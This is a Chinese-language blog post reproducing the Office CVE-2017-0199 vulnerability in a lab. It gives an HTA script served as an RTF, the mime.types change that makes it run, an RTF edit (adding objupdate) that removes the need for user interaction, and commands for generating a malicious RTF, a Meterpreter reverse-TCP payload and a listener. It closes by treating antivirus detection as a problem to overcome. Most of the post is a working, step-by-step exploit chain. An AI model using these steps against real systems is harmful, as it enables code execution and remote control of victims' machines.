---
layout: post
title: "Office CVE-2017-0199复现"
date: 2017-11-24 0:0:0
categories: jekyll update
---
## 介绍
<p>
&emsp;** 本文介绍在Ubuntu 14.04服务器版本下复现office cve-2017-0199。**
</p>
## 环境
> ubuntu 14.04服务器版

## 目录
* [验证](#1)
* [取消交互](#2)
* [Get Shell](#3)


### <a name="1"></a>1、验证
&emsp;Step 1：安装apache2服务
<div align="center">
    <img src="/images/posts/office/1.png" >  
</div>

&emsp;Step 2：在网站根目录下创建1.rtf，内容如下：
```script
test789 
<script> 
var objShell = new ActiveXObject("wscript.shell"); objShell.Run("%SystemRoot%\\system32\\calc.exe"); 
</script>

```

&emsp;Step 3：验证apache的配置文件mime.types里有rtf的content type项
因为mime.types的位置可能因系统而不同，所以直接使用find命令查找位置
<div align="center">
    <img src="/images/posts/office/2.png">  
</div>

&emsp;查看该文件，可以看到
<div align="center">
    <img src="/images/posts/office/3.png">  
</div>

&emsp;Step 4：使用office 2013 pro 创建空白文档，然后点击“插入”  “对象”,
在文件名上填写完整的网页地址，选择链接到文件
<div align="center">
    <img src="/images/posts/office/4.png">  
</div>

&emsp;点击“确定”，然后在文档中可以看到 test789。
<div align="center">
    <img src="/images/posts/office/5.png" >  
</div>

&emsp;注：在此步中，很可能不成功，具体原因未知。
具体现象：在链接到1.rtf时显示找到路径，不存在该文件。但去链接同目录下的index.html文件时可以成功，成因未知。


&emsp;Step 5：将mime.types中的application/rtf   rtf 改成 application/hta   rtf
重启apache服务
<div align="center">
    <img src="/images/posts/office/5.png">  
</div>

<div align="center">
    <img src="/images/posts/office/6.png">  
</div>

&emsp;Step 6：双击对象
<div align="center">
    <img src="/images/posts/office/7.png">  
</div>

<div align="center">
    <img src="/images/posts/office/8.png" >  
</div>

<div align="center">
    <img src="/images/posts/office/9.png">  
</div>

&emsp;可见成功利用`CVE-2017-0199漏洞`

-----------

### <a name="2"></a>2、取消交互
&emsp;为了`取消用户交互`，也就是让用户去双击
&emsp;Step 1：将文件另存为.rtf格式
<div align="center">
    <img src="/images/posts/office/10.png" >  
</div>

。。。。。直接被`卡巴`检测到恶意文件.
<div align="center">
    <img src="/images/posts/office/11.png" >  
</div>

&emsp;Step 2：用文本编辑器打开刚才保存的rtf格式文件，找到object标签所在地方
<div align="center">
    <img src="/images/posts/office/12.png">  
</div>

&emsp;把{object\objautlink\rsltpict 改成 {object\objautlink\objupdate\rsltpict

&emsp;保存文件再打开，这样就不用用户交互了。

&emsp;此时在虚拟机中新建一个空白文档，这时，在点击链接到文件后已经会自动弹出计算器了
虚拟机环境：win7，office 2010 pro
<div align="center">
    <img src="/images/posts/office/13.png">  
</div>

<div align="center">
    <img src="/images/posts/office/14.png">  
</div>

<div align="center">
    <img src="/images/posts/office/15.png">  
</div>
----------

### <a name="3"></a>3、Get Shell
&emsp;在kali中利用exploit
&emsp;Github地址：https://github.com/bhdresh/CVE-2017-0199

下载后，在情景1下实验

```python
1) Generate malicious RTF file
   # python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
3) Start toolkit in exploit mode to deliver local payload
   # python cve-2017-0199_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
```


按以上命令依次运行
<div align="center">
    <img src="/images/posts/office/16.png" >  
</div>

<div align="center">
    <img src="/images/posts/office/17.png">  
</div>

&emsp;可证实该exploit可行。
&emsp;但生成的.rtf在执行时会被杀软报毒，需要解决。
